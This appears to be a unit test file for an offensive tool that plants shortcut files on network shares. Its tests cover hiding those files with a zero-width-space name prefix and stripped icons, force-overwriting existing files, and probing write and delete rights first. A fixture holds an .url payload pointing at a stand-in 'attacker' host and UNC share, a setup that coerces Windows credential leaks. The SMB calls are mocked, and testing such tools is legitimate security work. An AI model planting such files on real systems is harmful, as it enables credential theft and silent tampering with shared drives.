"""Unit tests for PR 3 deploy safety flags: --force, --invisible, --probe-delete."""

from unittest.mock import MagicMock, patch
import pytest

from linksiren.pure_functions import (
    INVISIBLE_PREFIX,
    make_invisible_payload_name,
    make_invisible_payload_contents,
)
from linksiren.target import HostTarget


# --------------------------------------------------------------------- invisible


def test_invisible_prefix_is_zero_width_space():
    assert INVISIBLE_PREFIX == "​"


def test_make_invisible_payload_name_prepends_zwsp():
    assert make_invisible_payload_name("foo.url") == "​foo.url"


def test_make_invisible_payload_name_is_idempotent():
    once = make_invisible_payload_name("foo.url")
    twice = make_invisible_payload_name(once)
    assert once == twice


def test_make_invisible_contents_strips_icon_from_xml():
    xml = (
        '<?xml version="1.0"?><searchConnectorDescription>'
        "<iconReference>imageres.dll,-1003</iconReference>"
        "<isSearchOnlyItem>false</isSearchOnlyItem>"
        "</searchConnectorDescription>"
    )
    out = make_invisible_payload_contents(xml, ".searchConnector-ms")
    assert "iconReference" not in out
    assert "isSearchOnlyItem" in out


def test_make_invisible_contents_strips_icon_from_url():
    ini = (
        "[InternetShortcut]\n"
        "URL=http://attacker/test\n"
        "IconFile=\\\\attacker\\share\\icon.ico\n"
        "IconIndex=0\n"
    )
    out = make_invisible_payload_contents(ini, ".url")
    assert "IconFile" not in out
    assert "IconIndex" not in out
    assert "URL=http://attacker/test" in out


def test_make_invisible_contents_passthrough_for_lnk():
    raw = b"\x4c\x00\x00\x00binary lnk bytes here"
    assert make_invisible_payload_contents(raw, ".lnk") is raw


# --------------------------------------------------------------------- write_payload force


@pytest.fixture
def connected_target():
    t = HostTarget(host="example.local")
    t.connection = MagicMock()
    return t


def test_write_payload_force_false_existing_file_skips(connected_target):
    connected_target.connection.listPath.return_value = [
        MagicMock(get_longname=lambda: "p.url", is_directory=lambda: False)
    ]
    result = connected_target.write_payload(
        path="Finance\\2026", payload_name="p.url", payload=b"data"
    )
    assert result is None
    connected_target.connection.createFile.assert_not_called()


def test_write_payload_force_true_overwrites(connected_target):
    connected_target.connection.listPath.return_value = [
        MagicMock(get_longname=lambda: "p.url", is_directory=lambda: False)
    ]
    connected_target.connection.connectTree.return_value = 1
    connected_target.connection.createFile.return_value = 42

    result = connected_target.write_payload(
        path="Finance\\2026", payload_name="p.url", payload=b"data", force=True
    )
    assert result == "\\\\example.local\\Finance\\2026\\p.url"
    connected_target.connection.createFile.assert_called_once()
    connected_target.connection.writeFile.assert_called_once()


def test_write_payload_no_existing_file_proceeds_without_force(connected_target):
    connected_target.connection.listPath.return_value = []
    connected_target.connection.connectTree.return_value = 1
    connected_target.connection.createFile.return_value = 42

    result = connected_target.write_payload(
        path="Finance\\2026", payload_name="p.url", payload=b"data"
    )
    assert result == "\\\\example.local\\Finance\\2026\\p.url"


# --------------------------------------------------------------------- probe_delete


def test_probe_delete_success_proceeds_to_real_write(connected_target):
    # listPath returns empty (no existing file) and probe round-trip succeeds.
    connected_target.connection.listPath.return_value = []
    connected_target.connection.connectTree.return_value = 1
    connected_target.connection.createFile.return_value = 42

    result = connected_target.write_payload(
        path="Finance\\2026",
        payload_name="p.url",
        payload=b"data",
        probe_delete=True,
    )
    assert result == "\\\\example.local\\Finance\\2026\\p.url"
    # createFile called twice: probe + real
    assert connected_target.connection.createFile.call_count == 2
    # deleteFile called once for the probe
    assert connected_target.connection.deleteFile.call_count == 1


def test_probe_delete_create_failure_skips_real_write(connected_target):
    connected_target.connection.listPath.return_value = []
    connected_target.connection.connectTree.return_value = 1
    connected_target.connection.createFile.side_effect = Exception("STATUS_ACCESS_DENIED")

    result = connected_target.write_payload(
        path="Finance\\2026",
        payload_name="p.url",
        payload=b"data",
        probe_delete=True,
    )
    assert result is None
    connected_target.connection.writeFile.assert_not_called()


def test_probe_delete_delete_failure_skips_real_write(connected_target):
    connected_target.connection.listPath.return_value = []
    connected_target.connection.connectTree.return_value = 1
    connected_target.connection.createFile.return_value = 42
    connected_target.connection.deleteFile.side_effect = Exception("STATUS_ACCESS_DENIED")

    result = connected_target.write_payload(
        path="Finance\\2026",
        payload_name="p.url",
        payload=b"data",
        probe_delete=True,
    )
    assert result is None
    connected_target.connection.writeFile.assert_not_called()
